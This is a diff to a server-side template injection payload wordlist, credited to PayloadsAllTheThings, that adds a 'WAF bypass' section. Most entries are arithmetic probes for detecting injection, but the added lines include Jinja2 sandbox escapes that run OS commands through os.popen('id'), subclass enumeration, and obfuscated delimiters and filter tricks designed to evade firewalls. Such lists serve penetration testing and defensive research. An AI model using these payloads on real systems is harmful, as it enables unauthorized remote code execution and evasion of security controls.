@@ -1,6 +1,6 @@
 # Server-Side Template Injection payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 139 payloads
+# Total: 167 payloads
 {{7*7}}
 ${7*7}
 <%= 7*7 %>
@@ -142,3 +142,36 @@ ${T(java.lang.Math).sqrt(49)}
 <%= 8*8 %>
 ${{8*8}}
 %{7*7}
+
+# --- WAF bypass ---
+# template syntax obfuscation
+{#notscan#}{{7*7}}
+{{7*7}}{#notscan#}
+{% set notscan = 7*7 %}{{notscan}}
+{%print(7*7)%}
+{% print(7*7) %}
+{{7*7 if true else 0}}
+{{-7*-7}}
+{{7e0*7}}
+{{ 7 * 7 }}
+{%%7B7*7%7D%7D
+%7B%7B7*7%7D%7D
+# filter / attr bypass
+{{7*7|abs}}
+{{(7*7)|string}}
+{{7|attr('__mul__')(7)}}
+{{''|attr('__class__')}}
+{{''['__class__']}}
+{{request|attr('application')}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()|join(',')}}
+{% for x in [7] %}{{x*7}}{% endfor %}
+# alternate delimiters / multiline escapes
+${{ 7 * 7 }}
+ #{7*7}
+{{\n7*7\n}}
+{%\nprint(7*7)\n%}
+<%=7*7%>
+{math equation="7*7"}
+ #set($x=7*7)$x
